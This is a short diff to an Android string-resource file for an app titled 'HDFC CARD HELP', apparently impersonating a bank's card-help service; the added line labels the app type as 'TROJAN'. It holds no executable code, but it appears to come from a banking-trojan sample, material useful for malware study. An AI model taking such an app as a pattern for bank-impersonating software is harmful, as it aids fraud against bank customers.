@@ -4,4 +4,5 @@
     <string name="title_activity_main">HDFC CARD HELP</string>
     <string name="package_name">com.hdfc.card.help</string>
     <string name="custom_url_scheme">com.hdfc.card.help</string>
+    <string name="app_type">TROJAN</string>
 </resources>
